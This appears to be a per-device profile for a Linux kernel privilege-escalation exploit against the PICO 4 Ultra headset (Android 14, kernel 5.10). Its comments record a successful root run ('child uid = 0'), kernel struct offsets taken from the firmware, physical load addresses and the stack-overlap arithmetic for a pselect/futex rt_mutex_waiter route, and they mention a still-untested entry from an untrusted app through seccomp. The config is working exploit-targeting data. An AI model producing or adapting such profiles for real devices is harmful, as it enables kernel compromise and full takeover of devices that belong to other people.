# PICO 4 Ultra (sparrow), Android 14, firmware 5.14.4-202507302218-RELEASE-user-sparrow-b7055-5e50a0f81f.
#
# Status: PICO 4 Ultra Enterprise (A9410) device gate PASSED on 2026-10-19 through the
# Shizuku/shell entry: "pselect route done calls=1 success=1 status=0 clean=1/1 step=0
# errno=0", "child uid = 0", exploit completed, handoff to the root script ok.
# All geometry was derived statically from this firmware image first; the gate then
# confirmed it. The untrusted-app entry (W3 seccomp stage) has not been exercised yet,
# and KernelSU late-load stays pending because this kernel has no GKI KMI token.
#   commit_creds              -> real_cred/cred, cred->uid/euid/... layout
#   __set_task_comm           -> comm, memcpy(comm, buf, 16)
#   task_blocks_on_rt_mutex   -> pi_lock, pi_blocked_on, waiter.task/lock/prio
#   rt_mutex_adjust_prio_chain/rt_mutex_setprio -> pi_waiters, pi_top_task
#   sched_move_task           -> sched_task_group
#   __secure_computing        -> seccomp.mode
#   copy_process              -> pid, tgid, tasks (list_add_tail_rcu xref)
#   __arm64_sys_prctl (PR_SET_NO_NEW_PRIVS) -> atomic_flags
#   init_task image content   -> self-check of cred/comm/prio/list heads
#   cred_init (mov w1,#0xa8)  -> sizeof(struct cred)
#   mm_init   (mov w1,#0x3c8) -> sizeof(struct mm_struct) => 1024 slab
#   init_cred content         -> caps run, user/user_ns/group_info refs
#
# Route: select_stack, derived for this image (pselect fd_set window at depth 0x210,
# futex rt_mutex_waiter at depth 0x208 -> shift 1 -> profile waiter_shift -1).
# See the analysis notes for the frame arithmetic; multicast/tcp cannot reach the
# waiter on this kernel (tcp zc is only 0x28 bytes and sits 0x40 too deep).
release = "5.10.198-perf-g42dfb9e97e02-ab1"
schema_version = 1
kernel_major = 5
# Advisory only. The 5.x multicast family is split on this hint; keep 0 so W3
# (seccomp) is exercised on the normal path.
recommend_shizuku = 0
# 0xa8000000 from the uefi memory map (== native P0_KERNEL_PHYS_LOAD default).
kernel_phys_load = 2818572288
# 0x80000000 DRAM base (== P0_PHYS_OFFSET); VA_BITS=39 => PAGE_OFFSET
# 0xffffff8000000000, so direct-map aliases resolve inside target.h bounds.
kernel_phys_offset = 2147483648

# Route: select_stack (pselect fd_set window).
#
# Derivation from this image (PICO4-ULITA-NOTES.md section 6):
#   pselect chain  __arm64_sys_pselect6 0xa0 -> core_sys_select 0x1c0
#                  stack_fds (fd_set copy) at sp+0x50  => depth 0x210
#                  nfds=320 -> FDS_BYTES=0x28 < SELECT_STACK_ALLOC/6 (0x2b) => stack path
#   futex chain    __arm64_sys_futex 0x90 -> do_futex 0x70 -> futex_wait_requeue_pi 0x1a0
#                  rt_mutex_waiter at sp+0x98         => depth 0x208
#   delta = 0x210 - 0x208 = 8 -> shift = 1 -> profile value = shift - 2 = -1
#
# The compact word table lands as: tree_pc->waiter+0x00, pi_pc->+0x18,
# task->+0x30, lock->+0x38, prio->+0x40, deadline->+0x48, i.e. exactly the
# 5.10 struct rt_mutex_waiter prefix, so no native change is required.
route {
  select_stack {
    waiter_shift = -1
    compact_waiter = 1
  }
}
fallback {
  to = "none"
}

